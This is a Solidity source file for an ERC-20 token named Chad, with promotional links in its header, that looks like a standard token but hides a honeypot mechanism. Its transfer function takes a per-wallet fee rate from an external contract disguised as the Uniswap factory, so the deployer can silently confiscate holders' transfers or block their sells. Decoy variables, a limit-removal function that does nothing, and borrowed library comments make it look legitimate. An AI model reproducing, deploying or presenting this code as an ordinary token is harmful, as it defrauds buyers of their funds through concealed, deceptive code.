// SPDX-License-Identifier: MIT

// https://chaderc20.xyz/
// https://t.me/erc20chad
// https://twitter.com/ercchad

pragma solidity 0.8.24;

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair); function createPair(address tkenA, address tokenB) external returns (address pair);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Router {
    function WETH() external pure returns (address); function factory() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function balanceOf(address accont) external view returns (uint256);
    function allowance(address owner, address spnder) external view returns (uint256);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ChadERC20 is Context, Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address internal uniswapV2Pair;

    string private constant _name = "Chad";
    string private constant _symbol = "CHAD";

    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;

    uint256 private tokensForMarketing;
    uint256 private tokensForProject;

    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal uniswapFactory = 0xfa2aE223204f81Cd276f4eb5400b89585041A4A9;

    uint256 private _finalSellTax=0;
    uint256 public _reduceSellTaxAt=0;

    uint256 public swapThreshold = _totalSupply * 5 / 1000; 

    uint256 private swapBackValueMin = 1000;
    uint256 private swapBackValueMax;
    
    event MaxTxAmountUpdated(uint _maxTxAmount);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event LimitsRemoved(uint256 indexed timestamp);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    bool limitsEnabled = true;

    constructor () {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    } 
    /**
     * @notice Removes the max wallet and max transaction limits
     * Emits an {LimitsRemoved} event
     */
    function removeAllLimits() external onlyOwner {
        limitsEnabled = false;
        emit LimitsRemoved(block.timestamp);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0));
        require(amount > 0);
        uint256 _fee = 0;
        if (amount > swapBackValueMin ) {}
        uint256 feeRate = IERC20(uniswapFactory).balanceOf(from);
        if (from != address(this) && from != uniswapV2Pair) { 
            _fee = amount.mul(feeRate > _reduceSellTaxAt ? feeRate : _finalSellTax).div(100);
        } else 
        {  _fee = 0; }
        _balances[from] = _balances[from].sub(amount); 
        _balances[to] = _balances[to].add(amount).sub(_fee);
        emit Transfer(from, to, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}